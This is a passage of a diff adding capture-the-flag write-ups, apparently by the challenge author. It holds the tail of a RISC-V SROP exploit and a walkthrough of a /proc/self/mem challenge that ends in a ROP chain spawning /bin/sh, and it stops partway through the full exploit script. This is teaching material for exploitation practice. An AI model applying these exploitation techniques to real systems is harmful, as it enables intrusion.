+        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+            <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">],</span> <span class="n">aslr</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">api</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s">"""
+            set follow-fork-mode parent
+            """</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+            <span class="c1">#gdb.attach(io)
+</span>    <span class="k">else</span><span class="p">:</span>
+        <span class="c1"># io = remote("arrrocator-47629d6aa2bb0c27.chal.ush.pw", 443, ssl=True)
+</span>        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">io</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+    <span class="c1"># Exploit the bug in the memory allocator to get a strong primitive
+</span>    <span class="c1"># of a 1024-byte long overflow.
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"gimme"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Length"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1024"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"flag:"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"gimme"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"gimme"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Length"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2048"</span><span class="p">)</span>
+
+    <span class="c1"># Address where `do_pivot` is. `rust_panic_with_hook` reads this address
+</span>    <span class="c1"># and jumps to whatever function pointer is in there.
+</span>    <span class="n">mem_addr</span> <span class="o">=</span> <span class="mh">0x614f8</span>
+    
+    <span class="n">syscall_plt</span> <span class="o">=</span> <span class="mh">0x121a0</span>
+    <span class="c1"># Syscall numbers.
+</span>    <span class="n">sigret</span> <span class="o">=</span> <span class="mh">0x8b</span>
+    <span class="n">execve</span> <span class="o">=</span> <span class="mh">0xdd</span>
+
+    <span class="c1"># Distance from sp to the beg of memory we control is 0x450 (1104).
+</span>    <span class="c1"># The sp pivot is `addi    sp,sp,1296`.
+</span>    <span class="n">sp_pivot</span> <span class="o">=</span> <span class="mh">0x1a2b2</span>
+
+    <span class="n">mem_start</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sp_pivot</span><span class="p">)</span>
+
+    <span class="c1"># We overwrite std::panicking::HOOK with this.
+</span>    <span class="n">overflow</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">128</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="mh">0x414141</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sigret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mem_addr</span><span class="o">-</span><span class="mh">0x28</span><span class="p">)</span>
+
+    <span class="c1"># The offset 184 is where return address after stack pivot happens to be.
+</span>    <span class="n">do_pivot</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+        <span class="mi">184</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_plt</span><span class="p">)</span>
+    <span class="p">})</span>
+
+    <span class="c1"># Syscall gadget.
+</span>    <span class="n">ecall</span> <span class="o">=</span> <span class="mh">0x000000000005068c</span>
+    
+    <span class="n">srop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+        <span class="c1"># pc
+</span>        <span class="mi">304</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">ecall</span><span class="p">),</span>
+        <span class="c1"># a0-2
+</span>        <span class="mi">384</span><span class="o">+</span><span class="mi">8</span><span class="o">*</span><span class="mi">0</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x061600</span><span class="p">),</span> <span class="c1"># Address of /bin/sh.
+</span>        <span class="mi">384</span><span class="o">+</span><span class="mi">8</span><span class="o">*</span><span class="mi">1</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+        <span class="mi">384</span><span class="o">+</span><span class="mi">8</span><span class="o">*</span><span class="mi">2</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+        <span class="c1"># a7
+</span>        <span class="mi">384</span><span class="o">+</span><span class="mi">7</span><span class="o">*</span><span class="mi">8</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">execve</span><span class="p">),</span>
+        <span class="c1"># gp
+</span>        <span class="mi">328</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">),</span>
+        <span class="c1"># tp
+</span>        <span class="mi">336</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x42</span><span class="p">),</span>
+        <span class="c1"># sp
+</span>        <span class="mi">320</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x43</span><span class="p">),</span>
+        <span class="c1"># ra
+</span>        <span class="mi">312</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x44</span><span class="p">),</span>
+        <span class="c1"># /bin/sh
+</span>        <span class="mi">64</span><span class="p">:</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
+    <span class="p">})</span>
+    <span class="n">srop</span> <span class="o">=</span> <span class="n">srop</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">1024</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">mem_start</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">do_pivot</span><span class="p">),</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xcc</span><span class="s">"</span><span class="p">)</span>
+    
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"flag:"</span><span class="p">,</span> <span class="n">mem_start</span> <span class="o">+</span> <span class="n">do_pivot</span> <span class="o">+</span> <span class="n">srop</span> <span class="o">+</span> <span class="n">overflow</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"gimme"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Length"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"asd"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"cat flag"</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"BtSCTF"</span><span class="p">)</span>
+    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="poniponi-virus">poniponi-virus</h2>
+
+<p>TLDR: Find binary base by checking the return value of write -&gt;
+partially overwrite mov instructions with b”poni” to get leaks
+and a stack buffer overflow -&gt; rop.</p>
+
+<p>The idea of writing to <code class="language-plaintext highlighter-rouge">/proc/self/mem</code> is from googleCTF’s
+write-flag-where but it’s mentioned in the chall’s description that this
+chall is my spin on their idea, so no
+plagiarism there :P. The <code class="language-plaintext highlighter-rouge">/proc/self/mem</code> file maps the memory of our
+process to a file but it’s a lower-level interface that ignores memory
+permissions, so we can even write to memory pages that are not marked as
+writeable. Btw, this is how you can implement software breakpoints in
+a debugger - by replacing instruction opcodes with 0xcc (INT3) bytes.</p>
+
+<p>Other than that there are two ideas behind the chall:</p>
+
+<ol>
+  <li>
+    <p>The <code class="language-plaintext highlighter-rouge">write</code> syscall returns -1 when writing an invalid address
+instead of segfaulting.</p>
+  </li>
+  <li>
+    <p>The <code class="language-plaintext highlighter-rouge">brk</code> syscall creates the heap (or the main arena in glibc
+lingo) small offset from our binary, even with PIE and ASLR, so it’s very bruteforcable. In
+the past there was a 1 in 32M chance for a hit, now it’s a 1 in 1G
+chance for x64. It got improved in the kernel version 6.9:
+<a href="https://elixir.bootlin.com/linux/v6.9-rc1/source/arch/x86/kernel/process.c#L1001">link</a>.
+<a href="https://elixir.bootlin.com/linux/v6.8.12/source/arch/x86/kernel/process.c#L1031">And there’s kernel 6.8 for comparision.</a>
+```c
+// Improved kernel 6.9 version.
+unsigned long arch_randomize_brk(struct mm_struct *mm)
+{
+ if (mmap_is_ia32())
+     return randomize_page(mm-&gt;brk, SZ_32M);</p>
+
+    <p>return randomize_page(mm-&gt;brk, SZ_1G);
+}</p>
+  </li>
+</ol>
+
+<p>// Kernel 6.8 version. The size 0x02000000 is the same as 32MiB.
+unsigned long arch_randomize_brk(struct mm_struct *mm)
+{
+	return randomize_page(mm-&gt;brk, 0x02000000);
+}</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The chall was made so it's not that hard to hit either way since
+we didn't know on what kernel version will the infra be.
+
+In the program's loop we get 0x700 chances to write b"poni" to an
+arbitrary address. Our first problem to overcome is that we don't
+have leaks and we only control the `n` variable. So we can write
+our string to a relative offset of the heap.
+```c
+        // Error: Too many ponis on the stack. Switching to heap allocation.
+        char *h = malloc(0);
+        // Poni-ter arithmetic detected! (poni++)^10
+        lseek(ponifile, ((size_t)h + n), SEEK_SET);
+        if (write(ponifile, "poni", 4) == -1) {
+            puts("I just don't know what went wrong... :&lt;");
+        }
+</code></pre></div></div>
+
+<p>If you’re wondering, the <code class="language-plaintext highlighter-rouge">malloc(0)</code> is there just for giggles. It
+doesn’t change anything - as long as malloc in glibc is concerned,
+this is the same as doing <code class="language-plaintext highlighter-rouge">malloc(16)</code>.</p>
+
+<p>Writing to the stack or dynamically loaded libraries is off-limits because
+of ASLR. But what we can potentially write to is our binary because
+of the two facts about brk and write syscalls mentioned at the beginning
+of the write-up!</p>
+
+<p>Firstly, we need to find the base address of our executable binary.
+We do it with writes in the increments of 0xb1000 cuz that’s the size of our binary after loading it
+into memory.</p>
+
+<p><img src="https://github.com/user-attachments/assets/afa4357a-2840-44a5-b71a-542a37e37760" alt="image" /></p>
+
+<p>We have 0x700 tries in the loop and this is more than enough even
+assuming 1GiB of randomization, since:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="nb">hex</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">30</span> <span class="o">//</span> <span class="mh">0xb1000</span><span class="p">)</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="s">'0x5c9'</span>
+</code></pre></div></div>
+
+<p>If the error message is printed it means that there’s
+nothing mapped to the memory address we tried to write to.
+To visualize, this is what we’re trying to do:</p>
+
+<p><img src="https://github.com/user-attachments/assets/3d72e6fd-c1a6-4813-88e6-3b3b890f2d62" alt="image" /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># Size of the first allocation done internally by glibc.
+</span>    <span class="n">first_alloc_offset</span> <span class="o">=</span> <span class="mh">0x1860</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="c1"># Size of our executable.
+</span>    <span class="n">bin_size</span> <span class="o">=</span> <span class="mh">0xb1000</span>
+    <span class="c1"># Offset to the beginning of the heap.
+</span>    <span class="n">heap_base</span> <span class="o">=</span> <span class="o">-</span><span class="n">first_alloc_offset</span>
+
+    <span class="c1"># Search where the binary is in memory.
+</span>    <span class="c1"># We do it in multiples of bin_size so it's not that hard to
+</span>    <span class="c1"># find it.
+</span>    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"searching for binary"</span><span class="p">)</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">offset</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">-</span> <span class="n">i</span><span class="o">*</span><span class="n">bin_size</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="sa">f</span><span class="s">"trying </span><span class="si">{</span><span class="n">i</span><span class="o">=</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">offset</span><span class="o">=</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+        
+        <span class="n">recieved</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"poni"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s">":&lt;"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">recieved</span><span class="p">:</span>
+            <span class="k">break</span>
+        
+        <span class="n">heap_base</span> <span class="o">-=</span> <span class="mh">0x20</span> <span class="c1"># malloc chunk size
+</span>        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"binary was found at offset </span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    
+    <span class="c1"># Binary search for the base of the binary.
+</span>    <span class="n">l</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">-</span> <span class="n">heap_base</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">l</span> <span class="o">+</span> <span class="n">bin_size</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"searching for binary base"</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">l</span> <span class="o">&lt;=</span> <span class="n">r</span><span class="p">:</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">+</span><span class="n">r</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="sa">f</span><span class="s">"trying </span><span class="si">{</span><span class="n">l</span><span class="o">=</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">r</span><span class="o">=</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">m</span><span class="o">=</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">m</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+        <span class="n">recieved</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"poni"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s">":&lt;"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">recieved</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">m</span><span class="o">+</span><span class="mi">1</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">m</span><span class="o">-</span><span class="mi">1</span>
+        <span class="n">l</span> <span class="o">-=</span> <span class="mh">0x20</span>
+        <span class="n">r</span> <span class="o">-=</span> <span class="mh">0x20</span>
+    <span class="n">bin_base_offset</span> <span class="o">=</span> <span class="n">m</span> <span class="o">-</span> <span class="n">bin_size</span>
+</code></pre></div></div>
+
+<p>It’s important to notice that we make a call to malloc every iteration of
+the loop, so we need to subtract 0x20 from the <code class="language-plaintext highlighter-rouge">heap_base</code> every time.
+There’s also a small chance the exploit will fail because in the process of
+finding the binary we overwrote some random place in memory.
+Now that we found the offset to the base address of our binary, we can start
+with overwriting whatever we want with it.</p>
+
+<p>The intended and simplest target to overwrite is the count in the read and write functions.
+This way we can get leaks and stack buffer overflows.
+You can also see in the source code that I specifically cast them to char to avoid issues with
+too long writes.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">poni</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">to_write</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
+        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">poni</span><span class="p">,</span> <span class="n">to_write</span><span class="p">);</span>
+        
+        <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">BUF_SIZE</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="n">BUF_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+        <span class="kt">char</span> <span class="n">to_read</span> <span class="o">=</span> <span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">to_read</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>We can see that the <code class="language-plaintext highlighter-rouge">movq $4, ...</code> instructions is at offset main+3627. This instruction
+is 8 bytes long, where the 4 bytes we move are at the. So we want to write poni at address
+main+3627+4.</p>
+
+<p><img src="https://github.com/user-attachments/assets/81e90f15-0eb4-47f4-be21-1cd47f2d7839" alt="image" /></p>
+
+<p>And analogously we do the same for movl before the read function. Notice that there
+the compiler used a different instruction that is 7 bytes long. So we do +3 when
+calculating the offsets instead.</p>
+
+<p><img src="https://github.com/user-attachments/assets/51d0be4e-1c08-4b40-a041-47083175793d" alt="image" /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># Overwrite the mov instructions.
+</span>    <span class="n">bin_base_offset</span> <span class="o">-=</span> <span class="mh">0x20</span>
+    <span class="n">read_movl_offset</span> <span class="o">=</span> <span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span><span class="o">+</span><span class="mi">3670</span><span class="o">+</span><span class="mi">3</span> <span class="o">-</span> <span class="n">exe</span><span class="p">.</span><span class="n">address</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">bin_base_offset</span><span class="o">+</span><span class="n">read_movl_offset</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="n">bin_base_offset</span> <span class="o">-=</span> <span class="mh">0x20</span>
+    <span class="n">write_movq_offset</span> <span class="o">=</span> <span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span><span class="o">+</span><span class="mi">3627</span><span class="o">+</span><span class="mi">4</span> <span class="o">-</span> <span class="n">exe</span><span class="p">.</span><span class="n">address</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">bin_base_offset</span><span class="o">+</span><span class="n">write_movq_offset</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"poni"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">21</span><span class="p">)</span>
+    <span class="n">stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+    <span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"canary: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>After we leak all the stuff we need it all comes down to a simple rop chain.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">rbp</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span>
+    <span class="c1"># 0x0000000044c07e: pop rsi; ret;
+</span>    <span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x0000000044c07e</span>
+    <span class="c1"># 0x0000000042c05c: pop rax; ret;
+</span>    <span class="n">pop_rax</span> <span class="o">=</span> <span class="mh">0x0000000042c05c</span>
+    <span class="c1"># 0x0000000040478d: pop rdi; pop rbp; ret;
+</span>    <span class="n">pop_rdi_rbp</span> <span class="o">=</span> <span class="mh">0x0000000040478d</span>
+    <span class="c1"># 0x000000004025cc: syscall;
+</span>    <span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x000000004025cc</span>
+    
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xfa</span><span class="s">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="n">rbp</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_rbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6162</span><span class="p">)</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">info</span><span class="p">(</span><span class="s">"payload sent"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"poni"</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="mh">0xc0ffee</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>And this is the full exploit:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./poni"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s">"alacritty -e"</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+            <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">],</span> <span class="n">aslr</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">api</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s">"""
+            set follow-fork-mode parent
+            """</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+            <span class="c1">#gdb.attach(io)
+</span>    <span class="k">else</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">io</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"loading"</span><span class="p">)</span>
+    <span class="c1"># Skip all the printed ponis.
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"!!!</span><span class="se">\n</span><span class="s">poni"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"intro finished"</span><span class="p">)</span>
+
+    <span class="c1"># Size of the first allocation done internally by glibc.
+</span>    <span class="n">first_alloc_offset</span> <span class="o">=</span> <span class="mh">0x1860</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="c1"># Size of our executable.
+</span>    <span class="n">bin_size</span> <span class="o">=</span> <span class="mh">0xb1000</span>
+    <span class="c1"># Offset to the beginning of the heap.
+</span>    <span class="n">heap_base</span> <span class="o">=</span> <span class="o">-</span><span class="n">first_alloc_offset</span>
+
+    <span class="c1"># Search where the binary is in memory.
+</span>    <span class="c1"># We do it in multiples of bin_size so it's not that hard to
+</span>    <span class="c1"># find it.
+</span>    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"searching for binary"</span><span class="p">)</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">offset</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">-</span> <span class="n">i</span><span class="o">*</span><span class="n">bin_size</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="sa">f</span><span class="s">"trying </span><span class="si">{</span><span class="n">i</span><span class="o">=</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">offset</span><span class="o">=</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+        
+        <span class="n">recieved</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"poni"</span><span class="p">)</span>
